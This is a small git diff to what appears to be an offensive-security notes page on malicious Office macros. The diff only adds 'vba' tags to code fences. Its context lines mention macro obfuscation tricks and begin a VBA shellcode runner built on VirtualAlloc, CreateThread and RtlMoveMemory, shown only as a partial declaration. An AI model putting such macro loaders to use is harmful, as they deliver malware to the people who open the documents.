@@ -125,7 +125,7 @@ DOCX files referencing a template that includes macros can "execute" macros as w
 * Trigger from a button.
 * Leveraging unused code for obfuscation.
 
-```
+```vba
 Public Sub PrintDocumentProperties()
     Dim oApp As New Excel.Application
     Dim oWB As Workbook
@@ -165,7 +165,7 @@ End Sub
 
 This is a simple implementation of a shellcode execution which uses VirtualAlloc, CreateThread, and RtlMoveMemory to execute shellcode.
 
-```
+```vba
 Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes
 As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As
 LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
